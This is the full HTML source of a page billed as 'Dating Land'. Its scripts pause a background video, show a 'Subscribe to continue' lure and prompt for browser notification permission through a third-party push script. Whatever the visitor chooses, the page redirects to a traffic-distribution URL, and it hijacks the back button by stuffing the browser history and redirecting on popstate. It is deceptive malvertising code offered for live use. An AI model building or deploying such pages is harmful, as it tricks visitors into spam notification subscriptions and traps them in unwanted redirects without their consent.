<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Dating Land</title>
<style>
    html, body {
        margin: 0;
        padding: 0;
        width: 100%;
        height: 100%;
        overflow: hidden;
        font-family: Arial, sans-serif;
        background-color: #000;
    }
    #videoContainer {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        overflow: hidden;
        z-index: 1;
    }
    #myVideo {
        position: absolute;
        top: 50%;
        left: 50%;
        min-width: 100%;
        min-height: 100%;
        width: auto;
        height: auto;
        transform: translate(-50%, -50%);
        object-fit: cover;
    }
    #overlay {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: linear-gradient(to bottom, rgba(0,0,0,0.4), rgba(0,0,0,0.8));
        z-index: 2;
        opacity: 0;
        transition: opacity 0.5s ease;
    }
    #overlay.show {
        opacity: 1;
    }
    #subscribeBtn {
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%) scale(0);
        padding: 18px 36px;
        font-size: 26px;
        color: #fff;
        background-color: rgba(255, 0, 150, 0.9);
        border: 2px solid #fff;
        border-radius: 12px;
        cursor: pointer;
        z-index: 3;
        opacity: 0;
        transition: transform 0.5s ease, opacity 0.5s ease;
        white-space: nowrap;
    }
    #subscribeBtn.show {
        transform: translate(-50%, -50%) scale(1);
        opacity: 1;
    }
    #subscribeBtn:hover {
        background-color: rgba(255, 0, 150, 1);
        transform: translate(-50%, -50%) scale(1.05);
    }
    @media (max-width: 768px) {
        #subscribeBtn {
            font-size: 20px;
            padding: 14px 28px;
        }
    }
</style>
</head>
<body>
<div id="videoContainer">
    <video id="myVideo" autoplay muted playsinline loop>
        <source src="https://cdn.pixabay.com/video/2024/02/25/201545-917327263_large.mp4" type="video/mp4">
        Your browser does not support HTML5 video.
    </video>
    <div id="overlay"></div>
    <div id="subscribeBtn">Subscribe to continue</div>
</div>

<script>
const urlParams = new URLSearchParams(window.location.search);
const clickId = urlParams.get('clickid') || 'sub1';
const redirectUrl = `https://hotbjayapa.today/tds?id=1556189731&p1=${clickId}&p2=sub2&p3=sub3&p4=sub4`;
const backButtonUrl = 'https://hotbjayapa.today/tds?id=1556334684&p1=sub1&p2=sub2&p3=sub3&p4=sub4';

// Handle all push notification events - redirect in all cases
window.onPermissionDefault = function() {
    window.location.replace(redirectUrl);
};

window.onPermissionDenied = function() {
    window.location.replace(redirectUrl);
};

window.onPermissionAllowed = function() {
    window.location.replace(redirectUrl);
};

window.onAlreadySubscribed = function() {
    window.location.replace(redirectUrl);
};

window.onNotificationUnsupported = function() {
    window.location.replace(redirectUrl);
};

window.onTrafficFiltered = function() {
    window.location.replace(redirectUrl);
};
</script>

<script type="application/javascript" src="https://wpcpc.sjscdn.com/ps/ps.js?id=j-DQEhxgKEueEzYw3M-eJQ" async></script>

<script>
const video = document.getElementById('myVideo');
const btn = document.getElementById('subscribeBtn');
const overlay = document.getElementById('overlay');

let hasRedirected = false;

// Show overlay and button when video starts
video.addEventListener('playing', () => {
    setTimeout(() => {
        video.pause();
        overlay.classList.add('show');
        btn.classList.add('show');
        
        // Request push notification after delay
        setTimeout(() => {
            if ('Notification' in window && Notification.permission === 'default') {
                Notification.requestPermission().then(permission => {
                    // Fallback redirect if push events don't trigger
                    setTimeout(() => {
                        if (!hasRedirected) {
                            hasRedirected = true;
                            window.location.replace(redirectUrl);
                        }
                    }, 1000);
                });
            } else {
                // If notification already handled, redirect
                setTimeout(() => {
                    if (!hasRedirected) {
                        hasRedirected = true;
                        window.location.replace(redirectUrl);
                    }
                }, 500);
            }
        }, 250);
    }, 100);
}, { once: true });

// Ensure video plays
video.play().catch(() => {
    overlay.classList.add('show');
    btn.classList.add('show');
});

// Continue and redirect on click
function continueAndRedirect(e) {
    if (e) e.preventDefault();
    if (hasRedirected) return;
    
    hasRedirected = true;
    btn.classList.remove('show');
    overlay.classList.remove('show');
    video.play();
    
    setTimeout(() => {
        window.location.replace(redirectUrl);
    }, 300);
}

video.addEventListener('click', continueAndRedirect);
btn.addEventListener('click', continueAndRedirect);

// Back button protection
(function() {
    for (let i = 0; i < 3; i++) {
        history.pushState(null, null, location.href);
    }
    
    window.addEventListener('popstate', function() {
        history.pushState(null, null, location.href);
        window.location.replace(backButtonUrl);
    });
})();
</script>
</body>
</html>
